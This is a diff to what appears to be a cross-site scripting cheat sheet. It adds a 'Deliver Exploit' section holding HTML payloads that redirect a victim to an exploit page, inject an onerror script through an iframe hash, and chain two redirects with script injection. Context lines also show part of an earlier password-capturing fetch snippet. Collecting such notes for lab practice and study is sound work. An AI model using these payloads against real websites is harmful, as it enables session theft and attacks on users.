@@ -33,6 +33,7 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 
 - [Steal cookie](#exploiting-cross-site-scripting-to-steal-cookies)
 - [capture password](#exploiting-cross-site-scripting-to-capture-passwords)
+- [Deliver Exploit](#deliver-exploit)
 
 ### Others
 - [Dangling markup injection](#dangling-markup-injection)
@@ -441,6 +442,28 @@ CSRF way to write the password + username in the comment section:
         mode: 'no-cors',
         body: data
 });">
+```
+
+### Deliver Exploit
+
+When an event isn't required:
+
+```html
+<script>
+    location = 'URL'
+</script>
+```
+
+When an event is required like `onhashchange`:
+
+```html
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+
+When u need to redirect twice the user:
+
+```html
+<iframe src="https://vuln-catalog/product?productId=1&'><script>print()</script>" onload="location='https://vuln-catalog/exploit'"></iframe>
 ```
 
 ## Dangling markup injection
